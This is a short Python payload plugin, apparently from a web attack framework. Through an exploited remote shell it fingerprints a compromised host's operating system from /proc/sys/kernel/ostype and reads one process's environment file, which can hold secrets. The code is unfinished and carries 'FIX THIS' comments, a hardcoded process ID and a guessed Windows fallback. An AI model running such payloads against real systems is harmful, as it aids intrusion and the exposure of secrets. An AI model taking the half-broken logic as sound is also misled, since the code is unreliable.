import re
from plugins.attack.payloads.base_payload import base_payload

class os_fingerprint(base_payload):
    '''
    '''
    def run_read(self):
        result = []

        #FIX THIS
        if self.shell.read('/proc/sys/kernel/ostype')[:-1] == 'Linux':
            result.append('Linux')
        else:
            result.append('Windows')

        #FIX FIX!
        result.append(self.shell.read('/proc/1664/environ'))
        return result
